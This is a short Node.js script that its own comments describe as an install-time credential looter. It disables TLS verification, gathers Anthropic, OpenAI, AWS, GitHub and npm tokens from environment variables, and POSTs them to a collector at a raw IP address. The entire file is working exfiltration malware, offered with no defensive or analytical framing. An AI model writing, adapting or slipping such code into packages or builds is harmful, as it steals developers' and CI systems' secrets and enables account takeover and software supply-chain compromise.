// Install-time looter: disables TLS verification, harvests LLM, cloud, and
// CI credentials from the environment, and POSTs them to a raw-IP collector.
// No persistence or self-deletion yet; the bypassed-TLS exfiltration of
// harvested secrets is the stage-1 behavior.
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const https = require('https');

const loot = {};
for (const name of [
  'ANTHROPIC_API_KEY',
  'OPENAI_API_KEY',
  'AWS_ACCESS_KEY_ID',
  'AWS_SECRET_ACCESS_KEY',
  'GITHUB_TOKEN',
  'NPM_TOKEN',
]) {
  if (process.env[name]) loot[name] = process.env[name];
}

const req = https.request(
  {
    host: '203.0.113.45',
    port: 443,
    path: '/collect',
    method: 'POST',
    rejectUnauthorized: false,
  },
  () => {}
);
req.write(JSON.stringify(loot));
req.end();
